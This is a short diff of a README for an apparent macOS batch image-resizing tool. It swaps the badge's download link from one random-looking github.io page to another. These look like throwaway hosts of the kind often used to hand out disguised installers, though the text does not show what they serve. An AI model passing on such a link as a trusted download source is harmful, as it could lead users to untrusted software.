@@ -2,7 +2,7 @@
 
 Image Resizer mac on macOS — toolkit for batch resize & crop, presets for social sizes, and watermark and borders with native integrations for creator
 
-[![Download Image Resizer mac](https://img.shields.io/badge/Download-Image_Resizer_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Image Resizer mac](https://img.shields.io/badge/Download-Image_Resizer_mac-blueviolet)](https://lurapasayemdkfai.github.io/.github/Image-Resizer-Studio)
 
 ---
 
